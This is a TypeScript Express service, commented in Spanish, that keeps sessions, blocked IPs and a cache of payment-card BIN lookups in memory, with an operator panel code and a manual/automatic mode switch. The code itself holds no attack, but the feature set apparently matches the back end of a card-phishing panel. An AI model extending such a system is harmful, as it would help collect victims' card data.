import { Request } from "express";

/**
 * FirebaseService — implementación 100% en memoria.
 * No depende de MongoDB ni de ningún servicio externo.
 * Toda la persistencia de sesiones y estados se maneja con el
 * memoryStorage de StorageService; aquí solo guardamos los fallbacks
 * que los controladores esperan encontrar como "Firebase".
 */

// ──────────────────────────────────────────────────
// Stores en memoria
// ──────────────────────────────────────────────────
const sessionStore: Record<string, Record<string, unknown>> = {};
const blockedIpsStore: Set<string> = new Set();

// ──────────────────────────────────────────────────
// BIN checker en memoria
// ──────────────────────────────────────────────────
const binCache: Record<string, unknown> = {};

export class FirebaseService {

  // ── IP helpers ───────────────────────────────────

  static getClientIp(req: Request): string {
    return req.get("x-forwarded-for")?.split(",")[0] || req.socket.remoteAddress || "";
  }

  // ── Sesiones ─────────────────────────────────────

  static async saveSession(sessionId: string, data: any): Promise<void> {
    if (!sessionId) return;
    const current = sessionStore[sessionId] ?? {};
    sessionStore[sessionId] = {
      ...current,
      ...(data as Record<string, unknown>),
      updatedAt: new Date().toISOString(),
    };
  }

  static async getSession(sessionId: string): Promise<any> {
    return sessionStore[sessionId] ?? null;
  }

  static async getAllSessions(): Promise<any[]> {
    return Object.entries(sessionStore).map(([id, data]) => ({ sessionId: id, ...data }));
  }

  static async deleteSession(sessionId: string): Promise<void> {
    delete sessionStore[sessionId];
  }

  static async getSessionMessageId(sessionId: string): Promise<number | null> {
    const session = sessionStore[sessionId];
    if (!session) return null;
    const raw = Number(session.messageId);
    return Number.isFinite(raw) ? raw : null;
  }

  // ── IPs bloqueadas ────────────────────────────────

  static async getBlockedIps(): Promise<string[]> {
    return [...blockedIpsStore];
  }

  static async addBlockedIp(ip: string): Promise<void> {
    if (ip) blockedIpsStore.add(ip);
  }

  static async removeBlockedIp(ip: string): Promise<void> {
    blockedIpsStore.delete(ip);
  }

  // ── BIN checker ───────────────────────────────────

  static async getCardBinChecker(bin: string): Promise<unknown | null> {
    const normalized = String(bin || "").replace(/\D/g, "").slice(0, 6);
    if (normalized.length < 6) return null;
    return binCache[normalized] ?? null;
  }

  static isValidBinLookup(binLookup: unknown): boolean {
    if (!binLookup || typeof binLookup !== "object") return false;
    const data = (binLookup as { data?: unknown }).data;
    return Boolean(data && typeof data === "object");
  }

  static async saveDataCardBinChecker(entry: Record<string, unknown>): Promise<void> {
    const binRaw = String(
      entry?.bin ??
        (entry?.card as Record<string, unknown>)?.bin ??
        ""
    )
      .replace(/\D/g, "")
      .slice(0, 6);
    if (binRaw.length === 6) {
      binCache[binRaw] = entry;
    }
  }

  // ── Modo automático ──────────────────────────────

  static normalizeBoolean(value: unknown): boolean {
    if (typeof value === "boolean") return value;
    if (typeof value === "number") return value === 1;
    if (typeof value === "string") {
      const v = value.trim().toLowerCase();
      return v === "true" || v === "1" || v === "yes" || v === "si" || v === "on" || v === "activo";
    }
    return false;
  }

  static async getAutomaticMode(
    _sessionId?: string,
    _panelCodigo?: string
  ): Promise<boolean> {
    // En modo memoria siempre devuelve false (manual).
    // Si en el futuro se quiere activar globalmente, cambiar a true.
    return false;
  }
}
